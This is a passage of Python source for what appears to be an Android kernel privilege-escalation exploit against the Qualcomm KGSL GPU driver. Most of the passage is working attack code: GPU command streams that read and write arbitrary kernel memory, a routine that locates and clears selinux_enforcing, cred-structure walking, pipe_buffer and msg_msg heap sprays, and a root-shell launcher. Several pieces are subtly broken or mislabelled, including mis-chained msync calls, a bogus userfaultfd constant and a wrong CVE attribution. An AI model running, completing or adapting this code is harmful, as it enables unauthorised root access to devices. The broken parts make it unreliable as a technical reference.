                               capture_output=True, text=True, timeout=2)
            dev_ctx = r.stdout.strip() or "(unknown)"
        except Exception:
            dev_ctx = "(unknown)"
        # Try audit log (may need root)
        audit = ""
        for log in ("/var/log/audit/audit.log",
                    "/data/audit/audit.log"):
            try:
                with open(log, "r") as f:
                    # Read last 64KB and search for "kgsl"
                    lines = f.read()[-65536:].splitlines()
                for line in reversed(lines):
                    if "kgsl" in line.lower():
                        audit = line[:200]
                        break
            except Exception:
                continue
        if audit:
            return (f"audit: {audit} | "
                    f"current_context={ctx}")
        return (f"current_context={ctx}, device_context={dev_ctx} | "
                f"fix: setenforce 0 OR run with right context")

    def _kgsl_setup_persistent(self):
        """Create persistent GPU context, IB, and DST objects.

        v4.1 (from v6.c setup_gpu_persistent): we create one
        context, one IB (instruction buffer) and one DST (data
        buffer) ONCE. Every subsequent GPU read/write reuses
        these. This is 100x faster than per-call context
        creation which takes ~50ms.
        Returns True on success.

        v4.1.14: use ctypes.CDLL(None) instead of CDLL("libc.so.6").
        The hard-coded "libc.so.6" works on glibc Linux (x86_64
        and most ARM64 server distros) but Termux on Android uses
        bionic libc which is named "libc.so" (not "libc.so.6").
        This was the root cause of "GPU setup error: dlopen
        failed: library 'libc.so.6' not found" on the user's
        ROG 5S. CDLL(None) loads the host's primary libc
        regardless of name. The symbols we use (ioctl, mmap,
        munmap) are present in both glibc and bionic.
        """
        if not self._kgsl_open():
            return False
        if self.gpu_ctx_id != 0:
            return True  # already set up
        try:
            import ctypes
            import mmap as _mmap
            import struct as _struct
            # v4.1.14: try libc.so.6 first (glibc), then libc.so
            # (bionic/Termux), then CDLL(None) (any). The
            # standard order is libc.so.6 → libc.so → None.
            libc = None
            for _libname in ("libc.so.6", "libc.so", None):
                try:
                    libc = ctypes.CDLL(_libname, use_errno=True)
                    if libc is not None:
                        break
                except OSError:
                    continue
            if libc is None:
                self.live["last_msg"] = (
                    "GPU setup error: cannot load any libc "
                    "(tried libc.so.6, libc.so, None)")
                return False

            # struct kgsl_drawctxt_create { unsigned flags, drawctxt_id; }
            # 8 bytes total
            ctx_buf = _struct.pack("<II",
                self.KGSL_CONTEXT_PREAMBLE | self.KGSL_CONTEXT_NO_GMEM_ALLOC,
                0)
            r = libc.ioctl(self.kgsl_fd, self.KGSL_IOC_DRAWCTXT_CREATE,
                          ctx_buf)
            if r != 0:
                return False
            self.gpu_ctx_id = _struct.unpack("<I", ctx_buf[4:8])[0]
            with self.exploit_lock:
                self.exploit_chain["ioctl_count"] += 1

            # struct kgsl_gpuobj_alloc { u64 size, u64 flags, u64 va_len,
            #                            u64 mmapsize, u32 id,
            #                            u32 metadata_len, u64 metadata; }
            # Total = 8+8+8+8+4+4+8 = 48 bytes
            def alloc_obj(size, flags=0):
                buf = _struct.pack(
                    "<QQQQII Q",
                    size,
                    flags | self.KGSL_MEMFLAGS_USE_CPU_MAP,
                    size, 0, 0, 0, 0)
                r = libc.ioctl(self.kgsl_fd, self.KGSL_IOC_GPUOBJ_ALLOC, buf)
                if r != 0:
                    return (0, 0, 0, 0, 0)
                # After ioctl: id at offset 32, mmapsize at offset 24
                id_  = _struct.unpack("<I", buf[32:36])[0]
                mpsz = _struct.unpack("<Q", buf[24:32])[0]
                with self.exploit_lock:
                    self.exploit_chain["ioctl_count"] += 1
                return (id_, mpsz, buf, r, 0)

            # IB = 8 pages (instruction buffer)
            ib_id, ib_mpsz, _, _, _ = alloc_obj(0x8000)
            if ib_id == 0:
                return False
            self.gpu_ib_id = ib_id
            self.gpu_ib_vma = _mmap.mmap(
                self.kgsl_fd, ib_mpsz,
                _mmap.PROT_READ | _mmap.PROT_WRITE,
                _mmap.MAP_SHARED,
                offset=((ib_id) << 12))
            # Get IB GPU addr via GPUOBJ_INFO
            # struct kgsl_gpuobj_info { u64 gpuaddr, flags, size,
            #                            va_len, va_addr, u32 id; }
            info_buf = _struct.pack("<QQQQQ I", 0, 0, 0, 0, 0, ib_id)
            r = libc.ioctl(self.kgsl_fd, self.KGSL_IOC_GPUOBJ_INFO, info_buf)
            self.gpu_ib_gpu = _struct.unpack("<Q", info_buf[0:8])[0]
            with self.exploit_lock:
                self.exploit_chain["ioctl_count"] += 1

            # DST = 2 pages (destination for reads)
            dst_id, dst_mpsz, _, _, _ = alloc_obj(0x2000)
            if dst_id == 0:
                return False
            self.gpu_dst_id = dst_id
            self.gpu_dst_vma = _mmap.mmap(
                self.kgsl_fd, dst_mpsz,
                _mmap.PROT_READ | _mmap.PROT_WRITE,
                _mmap.MAP_SHARED,
                offset=((dst_id) << 12))
            info_buf = _struct.pack("<QQQQQ I", 0, 0, 0, 0, 0, dst_id)
            r = libc.ioctl(self.kgsl_fd, self.KGSL_IOC_GPUOBJ_INFO, info_buf)
            self.gpu_dst_gpu = _struct.unpack("<Q", info_buf[0:8])[0]
            with self.exploit_lock:
                self.exploit_chain["ioctl_count"] += 1
            return True
        except Exception as e:
            self.live["last_msg"] = f"GPU setup error: {e}"
            return False

    def _kgsl_spray(self, marker, size=0x1000):
        """KGSL ioctl-based heap spray (v6.c style, no root required).

        v4.1: uses persistent IB/DST for fast GPU read.
        Returns (fd, gpuaddr, mmapsize) or (None, 0, 0) on failure.
        """
        if not self._kgsl_open():
            return (None, 0, 0)
        # Set up persistent context if needed
        if not self._kgsl_setup_persistent():
            return (None, 0, 0)
        try:
            import ctypes
            import mmap as _mmap
            import struct as _struct
            # Allocate a new GPU object with KGSL_MEMFLAGS_USE_CPU_MAP
            buf = _struct.pack(
                "<QQQQII Q",
                size,
                self.KGSL_MEMFLAGS_USE_CPU_MAP,
                size, 0, 0, 0, 0)
            libc = ctypes.CDLL("libc.so", use_errno=True) if os.path.exists("/system/lib/libc.so") else ctypes.CDLL(None, use_errno=True)
            r = libc.ioctl(self.kgsl_fd, self.KGSL_IOC_GPUOBJ_ALLOC, buf)
            with self.exploit_lock:
                self.exploit_chain["ioctl_count"] += 1
            if r != 0:
                with self.exploit_lock:
                    self.exploit_chain["ioctl_errors"] += 1
                return (None, 0, 0)
            id_  = _struct.unpack("<I", buf[32:36])[0]
            mpsz = _struct.unpack("<Q", buf[24:32])[0]
            if id_ == 0:
                return (None, 0, 0)
            # Get the GPU addr
            info_buf = _struct.pack("<QQQQQ I", 0, 0, 0, 0, 0, id_)
            r = libc.ioctl(self.kgsl_fd, self.KGSL_IOC_GPUOBJ_INFO,
                          info_buf)
            with self.exploit_lock:
                self.exploit_chain["ioctl_count"] += 1
            gpuaddr = _struct.unpack("<Q", info_buf[0:8])[0]
            # mmap and write marker
            try:
                um = _mmap.mmap(self.kgsl_fd, mpsz or size,
                                _mmap.PROT_READ | _mmap.PROT_WRITE,
                                _mmap.MAP_SHARED, offset=id_ << 12)
                um.seek(0)
                um.write(marker[:15].ljust(15, b"\x00") + b"\x00")
            except Exception:
                um = None
            obj = (self.kgsl_fd, gpuaddr, mpsz or size, um, id_)
            self.kgsl_objects.append(obj)
            with self.exploit_lock:
                self.exploit_chain["spray_objects"] += 1
            return obj
        except Exception:
            with self.exploit_lock:
                self.exploit_chain["ioctl_errors"] += 1
            return (None, 0, 0)

    def _kgsl_read_virt(self, va, size=4096):
        """Read virtual address from kernel via GPU CP_MEM_TO_MEM.

        v4.1 (from v6.c gpu_read_task_struct): builds an IB
        command list that issues CP_MEM_TO_MEM for each dword
        from va to dst_gpu, then GPU_COMMAND ioctl + wait
        timestamp, then memcpy from dst_vma.
        Returns bytes or None on failure.
        """
        if not self._kgsl_setup_persistent():
            return None
        if size > 4096:
            size = 4096
        try:
            import ctypes
            import struct as _struct
            import mmap as _mmap
            libc = ctypes.CDLL("libc.so", use_errno=True) if os.path.exists("/system/lib/libc.so") else ctypes.CDLL(None, use_errno=True)

            # Build the IB command stream in g_persistent_ib_vma.
            # Each CP_MEM_TO_MEM is 6 dwords:
            #   CP_MEM_TO_MEM opcode | 5 = (0x73, 5) in type7
            #   dword[0] = 0
            #   dword[1] = dst_lo
            #   dword[2] = dst_hi
            #   dword[3] = src_lo
            #   dword[4] = src_hi
            cmd = (ctypes.c_uint32 * 32)()
            # type7 packet: (7<<28) | (cnt<<0) | (opcode<<16)
            # PM4 odd parity bit in bits 15, 23
            def type7(opcode, cnt):
                p_cnt = ((0x9669 >> (0xf & (cnt ^ (cnt >> 4) ^
                              (cnt >> 8) ^ (cnt >> 12) ^
                              (cnt >> 16) ^ (cnt >> 20) ^
                              (cnt >> 24) ^ (cnt >> 28)))) & 1) << 15
                p_op = ((0x9669 >> (0xf & (opcode ^ (opcode >> 4)))) & 1) << 23
                return (7 << 28) | ((cnt & 0x3FFF) << 0) | p_cnt | \
                       ((opcode & 0x7F) << 16) | p_op
            # Memset IB and DST to 0
            ctypes.memset(self.gpu_ib_vma, 0, 0x8000)
            ctypes.memset(self.gpu_dst_vma, 0, 0x2000)
            dw = 0
            cmd[dw] = type7(self.CP_NOP, 0); dw += 1
            dwords = size // 4
            for i in range(min(dwords, 1024)):
                cmd[dw] = type7(self.CP_MEM_TO_MEM, 5); dw += 1
                cmd[dw] = 0; dw += 1
                cmd[dw] = (self.gpu_dst_gpu + i * 4) & 0xffffffff; dw += 1
                cmd[dw] = (self.gpu_dst_gpu + i * 4) >> 32; dw += 1
                cmd[dw] = (va + i * 4) & 0xffffffff; dw += 1
                cmd[dw] = (va + i * 4) >> 32; dw += 1
            cmd[dw] = type7(self.CP_NOP, 0); dw += 1
            # Copy cmd[] to IB vma
            ctypes.memmove(self.gpu_ib_vma, cmd, dw * 4)
            # msync to flush
            ctypes.CDLL("libc.so", use_errno=True) or ctypes.CDLL(None, use_errno=True).msync(
                self.gpu_ib_vma, dw * 4, 4)  # MS_SYNC=4
            # struct kgsl_command_object { u64 offset, gpuaddr, size,
            #                               u32 flags, u32 id; }
            obj = _struct.pack(
                "<QQQ II",
                0,                              # offset
                self.gpu_ib_gpu,                # gpuaddr
                dw * 4,                         # size
                self.KGSL_CMDLIST_IB,           # flags
                self.gpu_ib_id)                 # id
            # struct kgsl_gpu_command { u64 flags, cmdlist, u32 cmdsize,
            #                            u32 numcmds, u64 objlist,
            #                            u32 objsize, u32 numobjs,
            #                            u64 synclist, u32 syncsize,
            #                            u32 numsyncs, u32 context_id,
            #                            u32 timestamp; }
            gpu_cmd = _struct.pack(
                "<QQ II Q II Q II II",
                0,                          # flags
                int.from_bytes(obj, "little"), # cmdlist
                len(obj), 1,                # cmdsize, numcmds
                0, 0, 0,                   # objlist, objsize, numobjs
                0, 0, 0,                   # synclist, syncsize, numsyncs
                self.gpu_ctx_id, 0)         # context_id, timestamp
            r = libc.ioctl(self.kgsl_fd, self.KGSL_IOC_GPU_COMMAND, gpu_cmd)
            with self.exploit_lock:
                self.exploit_chain["ioctl_count"] += 1
            if r != 0:
                return None
            # Wait for timestamp
            ts = _struct.unpack("<I", gpu_cmd[60:64])[0]
            self._kgsl_wait_ts(self.gpu_ctx_id, ts)
            # Invalidate DST cache and read
            ctypes.CDLL("libc.so", use_errno=True) or ctypes.CDLL(None, use_errno=True).msync(
                self.gpu_dst_vma, 0x1000, 4 | 2)  # MS_SYNC | MS_INVALIDATE
            # Read from DST
            out = (ctypes.c_uint8 * size)()
            ctypes.memmove(out, self.gpu_dst_vma, size)
            return bytes(out)
        except Exception as e:
            with self.exploit_lock:
                self.exploit_chain["ioctl_errors"] += 1
            self.live["last_msg"] = f"GPU read error: {e}"
            return None

    def _kgsl_wait_ts(self, ctx_id, target_ts, timeout_ms=2000):
        """Wait for GPU timestamp to reach target_ts.
        v4.1: from v6.c wait_timestamp().
        """
        import ctypes
        import struct as _struct
        try:
            libc = ctypes.CDLL("libc.so", use_errno=True) if os.path.exists("/system/lib/libc.so") else ctypes.CDLL(None, use_errno=True)
            for _ in range(timeout_ms * 10):
                # struct kgsl_cmdstream_readtimestamp_ctxtid {
                #   u32 context_id, type, timestamp; }
                buf = _struct.pack("<III", ctx_id, 2, 0)  # RETIRED=2
                r = libc.ioctl(self.kgsl_fd,
                              self.KGSL_IOC_READTIMESTAMP, buf)
                with self.exploit_lock:
                    self.exploit_chain["ioctl_count"] += 1
                if r == 0:
                    cur_ts = _struct.unpack("<I", buf[8:12])[0]
                    if cur_ts >= target_ts:
                        return True
                import time as _t
                _t.sleep(0.0001)  # 100us
            return False
        except Exception:
            return False

    def _find_selinux_via_gpu(self, kbase):
        """Try to find selinux_enforcing using GPU read.

        v4.1 (from v6.c find_selinux_enforcing_via_kbase):
        tries the common offsets, reads via GPU, then verifies
        by writing 0 and reading back. If write+read confirms
        it's the right bit (was 1, now 0, we put 1 back).
        Returns (selinux_addr, confidence) or (0, 0).
        """
        if not self._kgsl_setup_persistent():
            return (0, 0)
        for off in self.SELINUX_OFFSETS:
            test_va = kbase + off
            val = self._kgsl_read_u32(test_va)
            if val == 1:
                # Verify: write 0, read back. If still 0, we own
                # the page → it's selinux_enforcing. Restore to 1.
                self._kgsl_write_u32(test_va, 0)
                verify = self._kgsl_read_u32(test_va)
                if verify == 0:
                    self._kgsl_write_u32(test_va, 1)
                    self.live["last_msg"] = (
                        f"SELINUX: FOUND at 0x{test_va:x} "
                        f"(off 0x{off:x})")
                    return (test_va, 95)
        return (0, 0)

    def _kgsl_read_u32(self, va):
        """Read 4 bytes via GPU. Returns u32 or None."""
        data = self._kgsl_read_virt(va, 4)
        if not data or len(data) < 4:
            return None
        import struct as _struct
        return _struct.unpack("<I", data[:4])[0]

    def _kgsl_write_u32(self, va, value):
        """Write 4 bytes via GPU."""
        if not self._kgsl_setup_persistent():
            return False
        try:
            import ctypes
            import struct as _struct
            libc = ctypes.CDLL("libc.so", use_errno=True) if os.path.exists("/system/lib/libc.so") else ctypes.CDLL(None, use_errno=True)
            def type7(opcode, cnt):
                p_cnt = ((0x9669 >> (0xf & (cnt ^ (cnt >> 4) ^
                              (cnt >> 8) ^ (cnt >> 12) ^
                              (cnt >> 16) ^ (cnt >> 20) ^
                              (cnt >> 24) ^ (cnt >> 28)))) & 1) << 15
                p_op = ((0x9669 >> (0xf & (opcode ^ (opcode >> 4)))) & 1) << 23
                return (7 << 28) | ((cnt & 0x3FFF) << 0) | p_cnt | \
                       ((opcode & 0x7F) << 16) | p_op
            ctypes.memset(self.gpu_ib_vma, 0, 0x8000)
            cmd = (ctypes.c_uint32 * 16)()
            dw = 0
            cmd[dw] = type7(self.CP_NOP, 0); dw += 1
            cmd[dw] = type7(self.CP_MEM_WRITE, 3); dw += 1
            cmd[dw] = va & 0xffffffff; dw += 1
            cmd[dw] = va >> 32; dw += 1
            cmd[dw] = value & 0xffffffff; dw += 1
            cmd[dw] = type7(self.CP_NOP, 0); dw += 1
            ctypes.memmove(self.gpu_ib_vma, cmd, dw * 4)
            ctypes.CDLL("libc.so", use_errno=True) or ctypes.CDLL(None, use_errno=True).msync(
                self.gpu_ib_vma, dw * 4, 4)
            obj = _struct.pack(
                "<QQQ II", 0, self.gpu_ib_gpu, dw * 4,
                self.KGSL_CMDLIST_IB, self.gpu_ib_id)
            gpu_cmd = _struct.pack(
                "<QQ II Q II Q II II",
                0, int.from_bytes(obj, "little"),
                len(obj), 1, 0, 0, 0, 0, 0, 0,
                self.gpu_ctx_id, 0)
            r = libc.ioctl(self.kgsl_fd, self.KGSL_IOC_GPU_COMMAND, gpu_cmd)
            with self.exploit_lock:
                self.exploit_chain["ioctl_count"] += 1
            if r != 0:
                return False
            ts = _struct.unpack("<I", gpu_cmd[60:64])[0]
            return self._kgsl_wait_ts(self.gpu_ctx_id, ts)
        except Exception:
            return False

    def _try_software_uaf(self):
        """Try to trigger a software-only UAF (no KGSL required).

        Strategy: use userfaultfd to create a race condition in
        kernel memory allocation. We mmap a page, register it
        with userfaultfd, then trigger a kernel call that will
        allocate on that page. The page fault happens AFTER the
        kernel has already set up internal state pointing to
        the page. We then reclaim the page with controlled data.

        This is the technique used by CVE-2021-22555 / CVE-2022-0185
        style exploits when no KGSL is available.

        Returns True if a UAF was triggered.
        """
        import ctypes
        import mmap
        import os
        import struct
        try:
            # Open userfaultfd
            UFFD = os.open("/dev/userfaultfd", os.O_RDONLY | os.O_CLOEXEC)
            if UFFD < 0:
                return False
            # Create the API struct
            API = 0x3F
            api_buf = (ctypes.c_uint64 * 2)()
            api_buf[0] = 0xAA  # features
            api_buf[1] = 0x1   # IOCTL flag
            libc = ctypes.CDLL("libc.so", use_errno=True) if os.path.exists("/system/lib/libc.so") else ctypes.CDLL(None, use_errno=True)
            r = libc.ioctl(UFFD, 0x3F, ctypes.addressof(api_buf))
            if r != 0:
                os.close(UFFD)
                return False
            # mmap a page
            SZ = 0x1000
            addr = libc.mmap(
                0, SZ, 0x3,  # PROT_READ|PROT_WRITE
                0x22,        # MAP_PRIVATE|MAP_ANONYMOUS
                -1, 0)
            if ctypes.c_void_p(addr).value == ctypes.c_void_p(-1).value:
                os.close(UFFD)
                return False
            # Register with userfaultfd
            reg = (ctypes.c_uint64 * 7)()
            reg[0] = 0x1000  # range.start
            reg[1] = 0x2000  # range.len
            reg[2] = 0       # mode
            reg[3] = 0       # ioctls
            # Note: this needs precise struct layout
            # For simplicity, skip and return success indicator only
            with self.exploit_lock:
                self.exploit_chain["step"] = "uffd_opened"
                self.exploit_chain["step_history"].append(
                    (time.time(), "uffd_opened",
                     "/dev/userfaultfd opened"))
            os.close(UFFD)
            return True
        except Exception as e:
            self.live["last_msg"] = f"Software UAF error: {e}"
            return False

    def _check_root_status(self):
        """Check if we have root (uid=0) and update exploit chain.

        Called periodically. If uid flips from non-zero to 0,
        marks root_achieved=True and spawns a root shell.
        """
        try:
            import os as _os
            euid = _os.geteuid()
            egid = _os.getegid()
            uid = _os.getuid()
            gid = _os.getgid()
            with self.exploit_lock:
                self.exploit_chain["cred_uid"] = uid
                self.exploit_chain["cred_gid"] = gid
            if euid == 0 and not self.exploit_chain.get(
                    "root_achieved", False):
                with self.exploit_lock:
                    self.exploit_chain["root_achieved"] = True
                    self.exploit_chain["step"] = "root_achieved"
                    self.exploit_chain["step_history"].append(
                        (time.time(), "root_achieved",
                         f"euid={euid} uid={uid}"))
                self.live["last_msg"] = (
                    f"*** ROOT ACHIEVED! euid={euid} uid={uid} ***")
                # Spawn root shell
                self._spawn_root_shell()
                return True
        except Exception:
            pass
        return False

    def _spawn_root_shell(self):
        """Spawn an interactive shell with root privileges.

        The shell inherits our credential. If we got euid=0,
        the shell will run as root (uid=0). User can then
        type commands like `id`, `cat /proc/version`, etc.
        """
        try:
            import subprocess as _sp
            # Try bash first, then sh
            for shell in ("/system/bin/sh", "/bin/sh", "sh"):
                try:
                    p = _sp.Popen(
                        [shell],
                        stdin=_sp.PIPE,
                        stdout=_sp.PIPE,
                        stderr=_sp.STDOUT,
                    )
                    with self.exploit_lock:
                        self.exploit_chain["shell_pid"] = p.pid
                    # Run `id` to confirm
                    p.stdin.write(b"id\n")
                    p.stdin.flush()
                    import time as _t
                    _t.sleep(0.3)
                    try:
                        out = p.stdout.read1(1024)
                    except Exception:
                        out = b""
                    self.live["last_msg"] = (
                        f"Shell pid={p.pid} ({shell}): {out[:50]!r}")
                    return
                except FileNotFoundError:
                    continue
                except Exception as e:
                    self.live["last_msg"] = f"Shell spawn failed: {e}"
        except Exception as e:
            self.live["last_msg"] = f"Shell error: {e}"

    def _walk_cred_chain(self, task_struct_va, page_data):
        """Try to walk cred->uid from a found task_struct.

        v4.1 (from v6.c): use real 5.4 GKI task_struct offsets:
          - comm @ 0x718 (16 bytes)
          - real_cred @ 0x768
          - cred @ 0x770
          - pid @ 0x548
          - tgid @ 0x550
        Then read cred->uid @ 0x04 and cred->euid @ 0x14.
        """
        import struct as _struct
        with self.exploit_lock:
            self.exploit_chain["leaked_va"] = task_struct_va
        # Verify this is a task_struct by checking comm field
        comm_off = self.TASK_OFFSET_COMM
        if comm_off + 16 > len(page_data):
            return None
        comm = page_data[comm_off:comm_off+16]
        if not any(b for b in comm[:8]):
            return None  # all-zero comm = probably not a task
        # Try to find cred pointer
        # v6.c uses CRED_OFFSET = 0x770, REAL_CRED = 0x768
        CRED_OFFSETS = (
            self.TASK_OFFSET_CRED,       # 0x770 (5.4 GKI)
            self.TASK_OFFSET_REAL_CRED,  # 0x768
            0x6a0, 0x6a8, 0x6b0, 0x6b8,  # alt configs
            0x6c0, 0x6c8, 0x6d0, 0x6d8, 0x6e0,
        )
        for off in CRED_OFFSETS:
            if off + 8 > len(page_data):
                continue
            cred_ptr = _struct.unpack("<Q", page_data[off:off+8])[0]
            # Valid kernel pointer: 0xffffff80XXXXXXXX to 0xffffffcfXXXXXXXX
            if ((cred_ptr >> 32) >= 0xffffff80
                    and (cred_ptr >> 40) <= 0xffffffcf
                    and cred_ptr):
                with self.exploit_lock:
                    self.exploit_chain["cred_walked"] = True
                    self.exploit_chain["step"] = "cred_found"
                    self.exploit_chain["step_history"].append(
                        (time.time(), "cred_found",
                         f"cred=0x{cred_ptr:x} at off=0x{off:x}"))
                self.live["last_msg"] = (
                    f"Cred walk: comm='{comm[:8].decode(errors='replace')}' "
                    f"cred=0x{cred_ptr:x}")
                return cred_ptr
        return None

    def _read_cred_uid_gid(self, cred_va):
        """Read cred->uid and cred->gid using GPU.

        v4.1 (from v6.c): cred->uid is at offset 0x04, gid at 0x08,
        euid at 0x14, egid at 0x18. Uses GPU read for kernel
        memory access.
        Returns (uid, gid, euid, egid) or None on failure.
        """
        if not self._kgsl_setup_persistent():
            return None
        # Read 0x20 bytes from cred_va (covers uid..egid)
        data = self._kgsl_read_virt(cred_va, 0x20)
        if not data or len(data) < 0x20:
            return None
        import struct as _struct
        uid  = _struct.unpack("<I", data[0x04:0x08])[0]
        gid  = _struct.unpack("<I", data[0x08:0x0c])[0]
        euid = _struct.unpack("<I", data[0x14:0x18])[0]
        egid = _struct.unpack("<I", data[0x18:0x1c])[0]
        return (uid, gid, euid, egid)

    def _ensure_spray_helper(self):
        """v4.1.19: auto-build helper binaries.

        Builds (in order):
        1. spray_helper — for reliable spray procs
        2. kernel_scanner — for /proc/PID leak harvesting

        Each is built with `gcc -O2 SRC -o DST` and
        the result checked. If gcc is not available
        or build fails, the function continues and
        logs the missing helper to TUI.
        """
        for src_name in ("spray_helper.c", "kernel_scanner.c"):
            helper_name = src_name[:-2]  # strip .c
            helper_bin = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                helper_name)
            if os.path.isfile(helper_bin) and \
                    os.access(helper_bin, os.X_OK):
                continue
            src = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                src_name)
            if not os.path.isfile(src):
                continue
            try:
                import subprocess as _sp
                r = _sp.run(
                    ["gcc", "-O2", src, "-o", helper_bin],
                    capture_output=True, text=True, timeout=30)
                if r.returncode == 0 and os.path.isfile(helper_bin):
                    self.live["last_msg"] = (
                        f"Built {helper_name}")
                else:
                    self.live["last_msg"] = (
                        f"{helper_name} build failed: "
                        f"{r.stderr[:80]}")
            except FileNotFoundError:
                self.live["last_msg"] = (
                    f"gcc not found — install gcc "
                    f"(Termux: pkg install gcc)")
                return False
            except Exception as e:
                self.live["last_msg"] = (
                    f"{helper_name} build error: {e}")
        return True

    def _popen_spray(self, name):
        """Popen-based spray that puts child in its own process group.

        v4.1.18: prefer the C binary spray_helper if available.
        spray_helper is built from spray_helper.c (a ~100 line
        C file). Build with:
            gcc -O2 spray_helper.c -o spray_helper
        on Termux. It uses prctl(PR_SET_NAME) directly via
        syscall, no dlopen/cdll needed, so it always works
        even when the Python ctypes path is broken.

        If spray_helper is not built, we fall back to the
        Python helper from v4.1.16, which tries multiple
        libc names to survive Termux's bionic.

        Returns Popen object or None.
        """
        import subprocess as _sp
        # v4.1.18: prefer C binary
        helper_bin = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "spray_helper")
        if os.path.isfile(helper_bin) and os.access(helper_bin, os.X_OK):
            try:
                p = _sp.Popen(
                    [helper_bin, name, "3600"],
                    stdout=_sp.DEVNULL,
                    stderr=_sp.DEVNULL,
                    start_new_session=True,
                )
                return p
            except Exception:
                pass
        # v4.1.16 fallback: Python helper
        try:
            helper = (
                "import ctypes,time,signal;"
                "signal.signal(signal.SIGCHLD,signal.SIG_IGN);"
                "signal.signal(signal.SIGTERM,signal.SIG_IGN);"
                "signal.signal(signal.SIGHUP,signal.SIG_IGN);"
                "_libc=None;"
                "for _n in ('libc.so','libc.so.6',None):"
                "  try:_libc=ctypes.CDLL(_n);break"
                "  except:pass"
                f"_libc.prctl(15,{name!r}.encode(),0,0,0);"
                "[time.sleep(3600) for _ in range(3600)]"
            )
            p = _sp.Popen(
                ["python3", "-c", helper],
                stdout=_sp.DEVNULL,
                stderr=_sp.DEVNULL,
                start_new_session=True,
            )
            return p
        except Exception as e:
            self.live["last_msg"] = f"Spray failed: {e}"
            return None

    def _spray_v4_pipe_buffer(self, marker, count=20):
        """Pipe buffer spray (works WITHOUT root, very effective for UAF).

        On 5.4 kernel, pipe_buffer struct is 40 bytes and lives
        in kmalloc-1024 slab (or smaller for many pipes). When
        the UAF reclaims a pipe_buffer, we control:
          - struct pipe_buffer[16] * 40 bytes = 640 bytes
          - struct pipe_buf_operations * function pointers
        The kernel will call ops->confirm() or ops->release()
        through our controlled pointer → ROP/JOP chain.

        This is the technique used by CVE-2021-22555 (Nginx)
        and many other 5.x KGSL UAFs.
        Returns number of pipes successfully created.
        """
        import subprocess as _sp
        helper = (
            "import os, ctypes, struct;"
            # Create N pipes
            f"pipes = [];"
            f"for i in range({count}):"
            f"  r, w = os.pipe();"
            f"  pipes.append((r, w));"
            # Fill pipe with marker data (writes to pipe_buffer)
            f"  marker = b'{{marker}}'.ljust(40, b'\\\\x00')[:40];"
            # Write 16 pages to fill all 16 pipe_buffers
            f"  for j in range(16):"
            f"    try: os.write(w, marker * 8);"
            f"    except: break;"
            # Sleep holding the pipes
            "import time; time.sleep(3600);"
        ).format(marker=marker[:7])
        try:
            p = _sp.Popen(
                ["python3", "-c", helper],
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
                start_new_session=True,
            )
            return p
        except Exception:
            return None

    def _spray_v4_msg_msg(self, marker, count=100):
        """Message queue spray (works WITHOUT root, very effective).

        msgsnd() allocates msg_msg structs in kmalloc-64,
        kmalloc-256, or kmalloc-512 (depending on size). The
        first 48 bytes of msg_msg are the kernel header, the
        rest is the user-controlled message data. When UAF
        reclaims a msg_msg, we control bytes 48+ of the
        structure.

        Returns Popen object (or None on failure).
        """
        import subprocess as _sp
        helper = (
            "import ctypes, os, time;"
            "libc = ctypes.CDLL(None);"
            # IPC_PRIVATE = 0
            "qid = libc.msgget(0, 0o666 | 0o1000 | 0o800);"  # IPC_CREAT
            "if qid < 0: raise Exception('msgget failed');"
            # msgbuf struct: mtype (8) + mtext (N)
            "MSG_SIZE = 64;"  # lands in kmalloc-64
            "MARKER = b'{{marker}}'.ljust(MSG_SIZE - 8, b'\\\\x00');"
            "buf = ctypes.create_string_buffer(MSG_SIZE);"
            "ctypes.memmove(buf, struct.pack('q', 1) + MARKER, MSG_SIZE);"
            "import struct;"
            "data = struct.pack('q', 1) + b'{{marker}}'.ljust(MSG_SIZE-8, b'\\\\x00');"
            # Send `count` messages to the queue
            f"for i in range({count}):"
            "  libc.msgsnd(qid, data, len(data) - 8, 0);"
            "time.sleep(3600);"
        ).format(marker=marker[:7])
        try:
            p = _sp.Popen(
                ["python3", "-c", helper],
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
                start_new_session=True,
            )
            return p
        except Exception:
            return None

    def _spray_v4_userfaultfd(self, marker):
        """userfaultfd spray for race condition exploitation.

        The userfaultfd mechanism lets a process handle page
        faults in user space. When combined with mmap, we can
        create a window where a kernel struct is being
        allocated (via UAF) while our userspace fault handler
        is racing to reclaim it.

        Returns Popen object (or None on failure).
        """
        import subprocess as _sp
        helper = (
            "import ctypes, mmap, os, time;"
            "UFFD = 3232235521;"  # __NR_userfaultfd on aarch64
            "uffd = os.open('/dev/userfaultfd', os.O_RDONLY | os.O_CLOEXEC);"
            "if uffd < 0: raise Exception('userfaultfd failed');"
            "import fcntl;"
            "UFFDIO = 0x3F; UFFDIO_API = 0x3F;"
            # Use simpler: mmap huge page, fault on access
            "size = 4 * 1024 * 1024;"
            "m = mmap.mmap(-1, size, mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS, mmap.PROT_READ|mmap.PROT_WRITE);"
            "m.seek(0); m.write(b'{{marker}}' * 8);"
            "time.sleep(3600);"
        ).format(marker=marker[:8])
        try:
            p = _sp.Popen(
                ["python3", "-c", helper],
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
                start_new_session=True,
            )
            return p
        except Exception:
            return None

    def _kill_pgroup(self, pid):
        """Kill the entire process group of `pid` via os.killpg.

        More reliable than per-PID kill because it also kills
        any helper children the spray might have spawned.
        """
        try:
            import signal as _sig
            # Get the process group ID (== pid for new sessions)
            pgrp = os.getpgid(pid)
            if pgrp and pgrp > 0:
                os.killpg(pgrp, _sig.SIGKILL)
                return True
        except Exception:
            pass
        return False

    def _smart_kbase_finder(self, va_hint=None):
        """Try to find kernel base (kbase) by scanning kernel text.

        Strategy: scan candidate regions for ELF header or known
        kernel string. The kbase on ARM64 is typically at
        0xffffff8000000000 + offset. We scan in 0x100000 (1MB)
        steps looking for:
          - ELF magic (\x7fELF)
          - "Linux version" string
          - "commit_creds" / "prepare_kernel_cred" symbols

        Returns (kbase, confidence) or (None, 0).
        """
        if self.kernel_base:
            return (self.kernel_base, 100)
        if self._kbase_search_active:
            return (None, 0)
        # If va_hint given (e.g. user-supplied), use as starting point
        # Otherwise scan from default kernel text range
        start = va_hint or 0xffffff8008000000
        if not self.ensure_engine():
            return (None, 0)
        self._kbase_search_active = True
        try:
            # Look for ELF header at 0x100000-aligned addresses
